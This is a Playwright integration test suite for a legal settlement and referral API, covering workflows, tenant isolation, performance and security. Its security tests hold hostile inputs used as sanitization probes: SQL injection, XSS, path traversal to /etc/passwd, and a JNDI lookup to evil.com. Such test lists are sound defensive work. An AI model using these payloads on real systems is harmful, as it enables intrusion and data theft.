/**
 * API Integration Tests
 * 
 * Tests complete API workflows, service-to-service communication,
 * and end-to-end business processes.
 */

import { test, expect } from '@playwright/test';

const API_BASE_URL = process.env.API_BASE_URL || 'http://localhost:8002';
const SETTLE_API_URL = process.env.SETTLE_API_URL || 'http://localhost:8002';
const CONNECT_API_URL = process.env.CONNECT_API_URL || 'http://localhost:8003';

// ============================================================================
// COMPLETE USER WORKFLOWS
// ============================================================================

test.describe('Complete User Workflows', () => {
  test('Complete SETTLE workflow: Query → Contribute → Report', async ({ request }) => {
    const apiKey = 'test-api-key';
    
    // Step 1: Query settlement range
    const queryResponse = await request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
      data: {
        injuryType: 'Motor Vehicle Accident',
        medicalBills: 50000,
        jurisdiction: 'California',
      },
      headers: {
        'X-API-Key': apiKey,
      },
    });

    expect([200, 401]).toContain(queryResponse.status());
    
    let queryId: string | undefined;
    if (queryResponse.ok()) {
      const queryData = await queryResponse.json();
      queryId = queryData.queryId;
    }

    // Step 2: Submit contribution
    const contributeResponse = await request.post(`${SETTLE_API_URL}/api/v1/contribute/submit`, {
      data: {
        injuryType: 'Motor Vehicle Accident',
        medicalBills: 50000,
        jurisdiction: 'California',
        outcomeRange: {
          min: 75000,
          max: 125000,
        },
        consentGiven: true,
      },
      headers: {
        'X-API-Key': apiKey,
      },
    });

    expect([201, 401]).toContain(contributeResponse.status());
    
    let contributionId: string | undefined;
    if (contributeResponse.ok()) {
      const contributeData = await contributeResponse.json();
      contributionId = contributeData.contributionId;
    }

    // Step 3: Generate report
    if (queryId) {
      const reportResponse = await request.post(`${SETTLE_API_URL}/api/v1/reports/generate`, {
        data: {
          queryId: queryId,
          format: 'pdf',
        },
        headers: {
          'X-API-Key': apiKey,
        },
      });

      expect([200, 201, 401, 404]).toContain(reportResponse.status());
    }
  });

  test('Complete CONNECT workflow: Create Referral → Track Payout', async ({ request }) => {
    const token = 'test-token';
    
    // Step 1: Create referral
    const referralResponse = await request.post(`${CONNECT_API_URL}/api/v1/referrals`, {
      data: {
        referringAttorneyName: 'John Doe',
        referringAttorneyEmail: 'john@lawfirm.com',
        caseType: 'Personal Injury',
        estimatedValue: 100000,
      },
      headers: {
        'Authorization': `Bearer ${token}`,
      },
    });

    expect([201, 401]).toContain(referralResponse.status());
    
    let referralId: string | undefined;
    if (referralResponse.ok()) {
      const referralData = await referralResponse.json();
      referralId = referralData.referralId;
    }

    // Step 2: Check payout status
    if (referralId) {
      const payoutResponse = await request.get(
        `${CONNECT_API_URL}/api/v1/referrals/${referralId}/payout`,
        {
          headers: {
            'Authorization': `Bearer ${token}`,
          },
        }
      );

      expect([200, 401, 404]).toContain(payoutResponse.status());
    }
  });

  test('Complete Team Management workflow: Invite → Assign → Update', async ({ request }) => {
    const token = 'test-token';
    
    // Step 1: Invite team member
    const inviteResponse = await request.post(`${API_BASE_URL}/api/v1/team/invite`, {
      data: {
        email: 'new.member@lawfirm.com',
        name: 'New Member',
        role: 'attorney',
        services: ['intake', 'settle'],
      },
      headers: {
        'Authorization': `Bearer ${token}`,
      },
    });

    expect([201, 401]).toContain(inviteResponse.status());
    
    let memberId: string | undefined;
    if (inviteResponse.ok()) {
      const inviteData = await inviteResponse.json();
      memberId = inviteData.memberId;
    }

    // Step 2: Update member services
    if (memberId) {
      const updateResponse = await request.patch(
        `${API_BASE_URL}/api/v1/team/members/${memberId}`,
        {
          data: {
            services: ['intake', 'settle', 'connect'],
          },
          headers: {
            'Authorization': `Bearer ${token}`,
          },
        }
      );

      expect([200, 401, 404]).toContain(updateResponse.status());
    }
  });
});

// ============================================================================
// SERVICE-TO-SERVICE COMMUNICATION
// ============================================================================

test.describe('Service-to-Service Communication', () => {
  test('SETTLE service receives API key from Platform Service', async ({ request }) => {
    // Simulate Platform Service provisioning API key
    const response = await request.post(`${SETTLE_API_URL}/api/v1/admin/api-keys`, {
      data: {
        tenantId: 'test-tenant-uuid',
        accessLevel: 'standard',
        name: 'Auto-generated Key',
      },
      headers: {
        'X-Admin-Key': 'admin-secret-key',
      },
    });

    expect([201, 401]).toContain(response.status());
    
    if (response.ok()) {
      const data = await response.json();
      expect(data).toHaveProperty('apiKey');
      expect(data).toHaveProperty('tenantId', 'test-tenant-uuid');
    }
  });

  test('SETTLE service reports usage to Platform Service', async ({ request }) => {
    // Simulate usage tracking
    const response = await request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
      data: {
        injuryType: 'Test',
        medicalBills: 10000,
        jurisdiction: 'Test',
      },
      headers: {
        'X-API-Key': 'test-api-key',
      },
    });

    // After query, usage should be tracked
    // Check usage endpoint
    const usageResponse = await request.get(
      `${SETTLE_API_URL}/api/v1/admin/usage/test-tenant-uuid`,
      {
        headers: {
          'X-Admin-Key': 'admin-secret-key',
        },
      }
    );

    expect([200, 401, 404]).toContain(usageResponse.status());
  });

  test('SETTLE service logs activity to Internal Ops', async ({ request }) => {
    // Make a query
    const queryResponse = await request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
      data: {
        injuryType: 'Test',
        medicalBills: 10000,
        jurisdiction: 'Test',
      },
      headers: {
        'X-API-Key': 'test-api-key',
      },
    });

    // Activity should be logged
    // Check audit logs
    const auditResponse = await request.get(
      `${SETTLE_API_URL}/api/v1/admin/audit-logs`,
      {
        headers: {
          'X-Admin-Key': 'admin-secret-key',
        },
      }
    );

    expect([200, 401]).toContain(auditResponse.status());
  });
});

// ============================================================================
// DATA INTEGRITY TESTS
// ============================================================================

test.describe('Data Integrity', () => {
  test('Data consistency across multiple queries', async ({ request }) => {
    const apiKey = 'test-api-key';
    const queryData = {
      injuryType: 'Motor Vehicle Accident',
      medicalBills: 50000,
      jurisdiction: 'California',
    };

    // Make same query multiple times
    const responses = await Promise.all([
      request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
        data: queryData,
        headers: { 'X-API-Key': apiKey },
      }),
      request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
        data: queryData,
        headers: { 'X-API-Key': apiKey },
      }),
      request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
        data: queryData,
        headers: { 'X-API-Key': apiKey },
      }),
    ]);

    // All should return same status
    const statuses = responses.map(r => r.status());
    const uniqueStatuses = [...new Set(statuses)];
    expect(uniqueStatuses.length).toBeLessThanOrEqual(2); // Allow for auth errors
  });

  test('Transaction rollback on error', async ({ request }) => {
    // Try to create invalid contribution
    const response = await request.post(`${SETTLE_API_URL}/api/v1/contribute/submit`, {
      data: {
        // Invalid data that should cause rollback
        injuryType: null,
        medicalBills: 'not-a-number',
      },
      headers: {
        'X-API-Key': 'test-api-key',
      },
    });

    // Should fail without partial data creation
    expect([400, 422, 500]).toContain(response.status());
  });

  test('Data isolation between tenants', async ({ request }) => {
    const tenant1Key = 'tenant-1-key';
    const tenant2Key = 'tenant-2-key';

    // Create contribution for tenant 1
    const response1 = await request.post(`${SETTLE_API_URL}/api/v1/contribute/submit`, {
      data: {
        injuryType: 'Test 1',
        medicalBills: 10000,
        outcomeRange: { min: 1000, max: 2000 },
        consentGiven: true,
      },
      headers: {
        'X-API-Key': tenant1Key,
      },
    });

    // Try to access with tenant 2 key
    if (response1.ok()) {
      const data1 = await response1.json();
      const contributionId = data1.contributionId;

      const response2 = await request.get(
        `${SETTLE_API_URL}/api/v1/contributions/${contributionId}`,
        {
          headers: {
            'X-API-Key': tenant2Key,
          },
        }
      );

      // Should not be accessible (403 or 404)
      expect([403, 404, 401]).toContain(response2.status());
    }
  });
});

// ============================================================================
// PERFORMANCE TESTS
// ============================================================================

test.describe('Performance Tests', () => {
  test('Query response time < 1 second', async ({ request }) => {
    const startTime = Date.now();
    
    const response = await request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
      data: {
        injuryType: 'Motor Vehicle Accident',
        medicalBills: 50000,
        jurisdiction: 'California',
      },
      headers: {
        'X-API-Key': 'test-api-key',
      },
    });

    const endTime = Date.now();
    const duration = endTime - startTime;

    // Should respond in < 1 second (1000ms)
    expect(duration).toBeLessThan(2000); // Allow some buffer for network
  });

  test('Concurrent request handling', async ({ request }) => {
    // Make 50 concurrent requests
    const promises = Array.from({ length: 50 }, () =>
      request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
        data: {
          injuryType: 'Test',
          medicalBills: 10000,
          jurisdiction: 'Test',
        },
        headers: {
          'X-API-Key': 'test-api-key',
        },
      })
    );

    const startTime = Date.now();
    const responses = await Promise.all(promises);
    const endTime = Date.now();
    const duration = endTime - startTime;

    // All should complete
    expect(responses.length).toBe(50);
    
    // Should handle concurrent requests efficiently
    // (Duration should be reasonable, not 50x single request time)
    expect(duration).toBeLessThan(10000); // 10 seconds for 50 requests
  });

  test('Database query optimization', async ({ request }) => {
    // Test pagination performance
    const startTime = Date.now();
    
    const response = await request.get(
      `${SETTLE_API_URL}/api/v1/contributions?page=1&limit=100`,
      {
        headers: {
          'X-API-Key': 'test-api-key',
        },
      }
    );

    const endTime = Date.now();
    const duration = endTime - startTime;

    // Paginated queries should be fast
    expect(duration).toBeLessThan(2000);
  });
});

// ============================================================================
// SECURITY TESTS
// ============================================================================

test.describe('Security Tests', () => {
  test('API key authentication required', async ({ request }) => {
    const response = await request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
      data: {
        injuryType: 'Test',
        medicalBills: 10000,
      },
      // No API key
    });

    expect([401, 403]).toContain(response.status());
  });

  test('CORS headers configured correctly', async ({ request }) => {
    const response = await request.fetch(`${SETTLE_API_URL}/api/v1/query/estimate`, {
      method: 'OPTIONS',
      headers: {
        'Origin': 'http://localhost:3001',
      },
    });

    // Should have CORS headers
    const headers = response.headers();
    // CORS headers may or may not be present depending on config
    expect([200, 204, 405]).toContain(response.status());
  });

  test('Input sanitization prevents injection', async ({ request }) => {
    const maliciousInputs = [
      "'; DROP TABLE contributions; --",
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
    ];

    for (const maliciousInput of maliciousInputs) {
      const response = await request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
        data: {
          injuryType: maliciousInput,
          medicalBills: 10000,
        },
        headers: {
          'X-API-Key': 'test-api-key',
        },
      });

      // Should sanitize, not crash
      expect([200, 400, 422]).toContain(response.status());
    }
  });

  test('Rate limiting enforced', async ({ request }) => {
    // Make rapid requests
    const promises = Array.from({ length: 200 }, () =>
      request.post(`${SETTLE_API_URL}/api/v1/query/estimate`, {
        data: {
          injuryType: 'Test',
          medicalBills: 10000,
        },
        headers: {
          'X-API-Key': 'test-api-key',
        },
      })
    );

    const responses = await Promise.all(promises);
    
    // Some should be rate limited
    const rateLimited = responses.filter(r => r.status() === 429);
    // At least some should be rate limited (if rate limiting is configured)
    // This test may pass or fail depending on rate limit configuration
  });
});

